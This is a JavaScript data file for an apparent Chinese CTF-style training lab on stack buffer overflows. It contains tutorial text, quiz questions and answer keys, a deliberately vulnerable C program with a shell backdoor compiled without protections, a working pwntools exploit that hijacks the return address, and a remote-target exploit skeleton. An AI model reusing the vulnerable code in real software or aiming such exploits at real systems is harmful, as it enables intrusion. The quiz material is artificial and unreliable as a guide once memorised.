// 栈溢出实验模拟数据（依据《实验5-缓冲区溢攻击-教程》改编，适配 Linux noVNC 操作环境）
export const StackOverflowExperiment = {
  id: 15,
  name: '栈溢出实验',
  introduction:
    '本实验带你从零理解并实践栈溢出：在操作环境中自己编写一个含后门的漏洞程序，用 pwndbg 定位溢出点，再用 pwntools 编写 exp 劫持函数返回地址，拿到本机 shell 并读取 flag，完成栈溢出学习闭环。',
  difficulty: 3,
  taskPoints: [
    {
      id: 1,
      name: '栈与栈帧基础',
      description: '理解栈结构、关键寄存器、栈帧与返回地址，掌握栈溢出的基本原理',
      score: 15,
      document: `## 栈与栈帧基础

在学习栈溢出之前，先理解程序运行时的**栈**（Stack）结构。

### 1. 栈是什么
栈是一种**后进先出**（LIFO）的数据结构，程序运行时用它保存函数的局部变量、参数、以及最关键的——**函数返回地址**。栈通常从高地址向低地址增长。

### 2. 关键寄存器（64 位）
- **rsp**：栈指针，始终指向栈顶。
- **rbp**：基址指针，指向当前栈帧的底部。
- **rip**：指令指针，指向下一条将要执行的指令。（32 位对应 esp / ebp / eip）

### 3. 栈帧与返回地址
每次函数调用都会在栈上开辟一个**栈帧**，其中保存了调用者的 rbp 和**返回地址**。函数执行 ret 时，CPU 会把栈上保存的返回地址弹入 rip，从而跳回调用者继续执行。

### 4. 栈溢出原理
如果程序向栈上的缓冲区写入的数据超过了缓冲区大小，又没有做长度校验，多出来的数据就会**覆盖相邻的栈内存**，包括保存的 rbp 和返回地址。一旦返回地址被我们控制，函数 ret 时就会跳到我们指定的地址——这就是栈溢出攻击的本质：**用溢出数据改写返回地址，劫持 rip 执行流**。

栈布局（高地址在上）大致如下：

~~~text
高地址
  ┌───────────────┐
  │    返回地址     │  <- 溢出目标：改写成 shell 函数地址
  ├───────────────┤
  │   保存的 rbp    │
  ├───────────────┤
  │   局部缓冲区     │  <- read() 写入起点，溢出从这里向上淹没
  └───────────────┘
低地址
~~~`,
      questions: [
        {
          id: 1,
          content: '指令指针寄存器 rip（32 位下的 eip）的作用是？',
          score: 5,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['指向栈顶', '指向当前栈帧底部', '指向下一条将要执行的指令', '保存函数返回值'],
          answer: [2]
        },
        {
          id: 2,
          content: '栈溢出攻击的最终目标是？',
          score: 5,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['耗尽系统内存', '覆盖返回地址以劫持程序执行流', '加密磁盘数据', '提升网络带宽'],
          answer: [1]
        },
        {
          id: 3,
          content: '在 64 位程序里，紧邻局部缓冲区、溢出时会先被淹没覆盖的通常是？',
          score: 5,
          requiresTarget: false,
          type: 'single-choice',
          options: ['rip 寄存器本身', '保存的 rbp 与返回地址', '堆内存', '全局变量区'],
          answer: 1
        }
      ]
    },
    {
      id: 2,
      name: '实验环境准备',
      description: '认识操作环境里的 vim、gcc、gdb+pwndbg、pwntools 及其用途',
      score: 10,
      document: `## 实验环境准备

本实验在平台的**操作环境**（noVNC 桌面）中完成。点击详情页右侧「操作环境」页签启动桌面，桌面里已预装以下工具：

### 1. vim —— 文本编辑器
用来编写 C 源码和 exp 脚本。基本用法：**vim pwn.c** 打开文件，按 **i** 进入编辑模式，编辑完成后按 **Esc**，再输入 **:wq** 回车保存退出。（从外部粘贴代码若 vim 失焦，需再按一次 i）

### 2. gcc —— C 编译器
把 pwn.c 编译成可执行程序，编译时可通过参数关闭各种保护，方便教学练习。

### 3. gdb + pwndbg —— 调试器
gdb 是 Linux 下的调试器，**pwndbg 是 gdb 的一个插件**，专为二进制漏洞利用设计，能直观显示寄存器、栈、反汇编等信息。用 **gdb pwn** 启动调试。

### 4. pwntools —— Python 漏洞利用库
一个专为二进制利用设计的 Python 库，简化了与程序交互、构造 payload、打包地址等工作。在 exp 脚本开头导入 pwntools 后即可使用其全部功能。

> 提示：教程原版用 Windows 上的 IDA 找函数地址，本平台的操作环境是 Linux 桌面，我们改用 **pwndbg** 完成同样的工作，流程等价。`,
      questions: [
        {
          id: 1,
          content: 'pwndbg 是什么？',
          score: 5,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['一个独立的反汇编器', 'gdb 的一个调试插件', '一种编程语言', '一款杀毒软件'],
          answer: [1]
        },
        {
          id: 2,
          content: 'pwntools 在栈溢出利用中的主要用途是？',
          score: 5,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['与程序交互、构造 payload、打包地址', '编译 C 程序', '管理数据库', '扫描端口'],
          answer: [0]
        }
      ]
    },
    {
      id: 3,
      name: '编写漏洞程序',
      description: '用 vim 编写含后门的漏洞 C 程序并用 gcc 关闭保护编译',
      score: 25,
      document: `## 编写漏洞程序

### 1. 用 vim 编写 pwn.c
在操作环境终端输入 **vim pwn.c**，按 **i** 进入编辑模式，写入以下带栈溢出漏洞的程序：

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void shell()
{
    system("/bin/sh\\x00");   // 执行它即可获得运行该程序的 shell 权限
}

void init()
{
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);   // 关闭缓冲，让输入输出即时回显
}

int main()
{
    init();
    puts("hello hacker");
    char name[10];         // 只有 10 字节的小缓冲区
    read(0, name, 0x100);  // 却读入最多 0x100(256) 字节 —— 溢出点！
    return 0;
}
~~~

要点：
- **shell()** 里的 system("/bin/sh") 是我们故意留下的「后门」，只要能让程序返回到它，就能拿到本地 shell。
- **main()** 里 name 只有 10 字节，read 却允许写入 256 字节，多出的数据会覆盖 saved rbp 和返回地址，这就是溢出点。

### 2. 编译（关闭保护，便于教学）
按 **Esc** 再输入 **:wq** 保存退出，然后编译：

~~~bash
gcc -o pwn pwn.c -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro
~~~

各参数含义：
- **-fno-stack-protector**：关闭栈保护 Canary（否则溢出会被检测并中止程序）。
- **-z execstack**：栈可执行（本题用不到 shellcode，保持与教程一致即可）。
- **-no-pie**：关闭位置无关可执行，程序加载到固定地址，shell 函数地址固定、可直接写死。
- **-Wl,-z,norelro**：关闭 RELRO 保护。

编译后输入 **ls** 能看到 pwn 文件即表示成功。

### 3. 写入本地 flag
输入 **vim flag**，写入你自己的 flag（例如 flag{You_Have_did_it!}）并保存。稍后 getshell 成功就能 cat flag 读到它。`,
      questions: [
        {
          id: 1,
          content: '编译参数 -fno-stack-protector 的作用是？',
          score: 8,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['关闭地址随机化', '关闭栈保护 Canary', '开启数据执行保护', '进行静态链接'],
          answer: [1]
        },
        {
          id: 2,
          content: '为什么这个程序存在栈溢出漏洞？',
          score: 8,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['name 缓冲区只有 10 字节，read 却最多读入 256 字节', '使用了 printf 函数', '没有包含头文件', 'shell 函数没有被调用'],
          answer: [0]
        },
        {
          id: 3,
          content: '编译参数 -no-pie 在本实验里的好处是？',
          score: 9,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['让程序运行更快', '固定程序加载地址，使 shell 函数地址可以写死到 exp 中', '加密字符串常量', '开启多线程'],
          answer: [1]
        }
      ]
    },
    {
      id: 4,
      name: '定位溢出偏移',
      description: '用 gdb+pwndbg 调试，计算到返回地址的偏移，并找到 shell 函数地址',
      score: 25,
      document: `## 定位溢出偏移

### 1. 启动调试
~~~bash
gdb pwn
~~~
进入后**先下断点再运行**（直接 r 会把程序一次跑完，看不到调试细节）：

~~~text
pwndbg> b main      # 在 main 函数下断点
pwndbg> r           # 运行到断点处
pwndbg> ni          # 单步执行下一条指令，逐步运行到 read
~~~
运行到 read 时程序会等待输入，此时输入 8 个 a，观察数据落在栈上的位置。pwndbg 界面上方是寄存器、中间是反汇编、下方是当前栈结构。

### 2. 计算到返回地址的偏移
name 缓冲区在栈上（对齐后）占用 **0x10** 字节，其上方是 8 字节的 **saved rbp**，再往上就是**返回地址**。所以从输入起点到返回地址的偏移是：

~~~text
0x10 (缓冲区) + 8 (saved rbp) = 0x18 = 24 字节
~~~
也就是说：先填 24 字节垃圾数据，第 25 字节开始就是要覆盖的返回地址。

### 3. 找 shell 函数地址（用 pwndbg 代替 IDA）
~~~text
pwndbg> p shell               # 打印 shell 函数的地址
pwndbg> disassemble shell     # 反汇编 shell，查看每条指令的地址
~~~
教程中 shell 起始地址是 0x400686，但实际写 exp 时用 **0x40068a**——即 shell 函数里 **mov edi, offset** 那条指令的地址，跳过开头的 push rbp，以保证**栈平衡**（否则可能因堆栈不平衡而执行失败）。

> 如果你编译出的 shell 地址不同，就把 exp 里的地址换成你自己 disassemble 看到的、对应 mov edi, offset 那条指令的地址。`,
      questions: [
        {
          id: 1,
          content: '本例中，从输入起点到返回地址的偏移是多少？',
          score: 8,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['10 + 8 = 18 字节', '0x10 + 8 = 0x18 = 24 字节', '固定 0x100 字节', '只有 8 字节'],
          answer: [1]
        },
        {
          id: 2,
          content: '为什么 exp 里用 0x40068a，而不是 shell 函数起始地址 0x400686？',
          score: 8,
          requiresTarget: false,
          type: 'single-choice',
          options: ['地址写错了', '跳过开头的 push rbp 以保证栈平衡', '0x400686 这个地址不存在', '只是为了运行更快'],
          answer: 1
        },
        {
          id: 3,
          content: '在 pwndbg 中查看 shell 函数地址，可以使用哪些命令？',
          score: 9,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['p shell 或 disassemble shell', 'cat shell', 'ls shell', 'ping shell'],
          answer: [0]
        }
      ]
    },
    {
      id: 5,
      name: '本地溢出利用',
      description: '用 pwntools 编写 exp 覆盖返回地址，getshell 并读取 flag',
      score: 25,
      document: `## 本地溢出利用

### 1. 编写 exp.py
用 **vim exp.py** 写入以下 pwntools 脚本：

~~~python
from pwn import *                 # 导入 pwntools
io = process('./pwn')            # 启动本地程序（远程题改成 remote('ip', port)）
payload = b'a' * (0x10 + 8)      # 填充 24 字节到返回地址（buf 0x10 + saved rbp 8）
payload += p64(0x40068a)         # 覆盖返回地址，改成 shell 函数地址（换成你自己的！）
io.sendline(payload)             # 发送 payload
io.interactive()                 # 切换到交互模式，拿到 shell 后手动操作
~~~

payload 结构：**24 字节填充 + 8 字节返回地址**。p64 把地址打包成 64 位小端字节序。

### 2. 运行，拿 shell 读 flag
~~~bash
python3 exp.py
~~~
成功后会进入 **\$** 提示符（本地 shell），输入 **ls** 能看到当前目录文件，再输入 **cat flag** 读出你之前写入的 flag：

~~~text
$ ls
exp.py  flag  pwn  pwn.c
$ cat flag
flag{You_Have_did_it!}
~~~
恭喜！你通过一个自己编写的程序、利用栈溢出劫持返回地址，拿到了本机 shell 并读到了 flag，完成了栈溢出学习闭环。

### 3. 下一步（真实靶机）
本教程「示例2 危险的 gets」远程题链接已失效，本平台暂不提供。后续将接入真实**靶机环境**：你会连到一台没有 shell 权限的目标机，靠找到栈溢出点、编写 exp 远程 getshell 拿到 flag——那才是与传统 pwn 题一致的完整挑战，敬请期待。`,
      questions: [
        {
          id: 1,
          content: '本例中，正确的 payload 结构是？',
          score: 8,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['24 字节填充 + 8 字节返回地址（shell 地址）', '只发送 shell 地址', '只发送 8 个 a', '发送一段随机数据'],
          answer: [0]
        },
        {
          id: 2,
          content: 'pwntools 中 p64() 的作用是？',
          score: 8,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['把地址打包成 64 位小端字节序', '计算数字的平方', '发送一个网络数据包', '解密数据'],
          answer: [0]
        },
        {
          id: 3,
          content: '请粘贴你 getshell 后 cat flag 的输出（或描述你完成本实验的过程与收获）。',
          score: 9,
          requiresTarget: false,
          type: 'open-ended-with-answer'
        }
      ]
    },
    {
      id: 6,
      name: '远程靶机实战',
      description: '连接真实远程靶机，找到栈溢出点、编写 exp 远程 getshell 并提交 flag',
      score: 40,
      document: `## 远程靶机实战

前面你已在操作环境本地掌握了栈溢出。现在挑战一个**真实远程靶机**——和传统 pwn 题一样：你没有现成的 shell，只能通过漏洞 getshell 拿到 flag。

### 1. 连接靶机
本实验靶机默认已就绪并接入操作环境桌面网络，无需手动启动。直接在**操作环境桌面终端**里连接：
~~~bash
nc stack-overflow-lab-web-1 70
~~~
程序会要求你「给它一个满意的礼物」——先想办法满足条件、进入那个有 gets 的函数。

### 2. 拿到程序并分析
下载靶机程序到操作环境里分析：[点此下载靶机程序 halloween-pwn](/halloween-pwn)（下载后 \`chmod +x\`，用 pwndbg / objdump 分析）：
- 程序里有一个 **gets()**（无长度限制）—— 这就是溢出点。
- 有一个后门函数会执行 **system("/bin/sh")** —— 设法让返回地址指向它。
- 用 pwndbg \`disassemble\` 找后门地址、算缓冲区到返回地址的偏移；注意 **64 位下 system 的栈对齐**（必要时在返回地址前垫一个 ret gadget）。
- 进入 gets 之前可能要先通过一个整数校验（"礼物"）。

### 3. 编写 exp（pwntools）
~~~python
from pwn import *
io = remote('stack-overflow-lab-web-1', 70)
# payload = 满足礼物条件 + 填充到返回地址 + [ret 对齐] + 后门地址
# io.sendline(payload)
io.interactive()
~~~
getshell 后：
~~~bash
ls
cat flag
~~~

### 4. 提交 flag
把拿到的 flag 填到下方并提交即可校验（靶机默认已就绪，无需手动启动）。`,
      questions: [
        {
          id: 1,
          content: '提交你从远程靶机 getshell 后 cat flag 得到的 flag（格式 flag{...}）',
          score: 40,
          requiresTarget: true,
          type: 'open-ended-without-answer'
        }
      ]
    }
  ]
}
